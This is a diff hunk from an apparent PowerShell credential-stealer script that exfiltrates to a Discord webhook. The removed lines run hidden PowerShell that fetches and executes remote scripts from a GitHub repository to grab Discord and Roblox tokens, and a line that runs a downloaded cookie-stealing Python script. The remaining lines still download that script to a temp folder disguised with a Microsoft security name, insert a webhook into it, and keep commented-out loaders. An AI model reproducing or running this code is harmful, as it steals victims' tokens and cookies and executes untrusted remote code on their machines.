@@ -103,18 +103,14 @@ $payload = [PSCustomObject]@{
 
 ######################################################################
 
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID.ps1).content)
-#For grab discord tokens
-
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_gen.ps1).content)
-#For grab roblox info/tokens
+#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID.ps1).content)
+#Useless now
 
 
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
 (Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-#For grab all cookies (no thx lol) and i have a lot of dev
+#For grab all cookies
 
 #powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
 #For idk lol
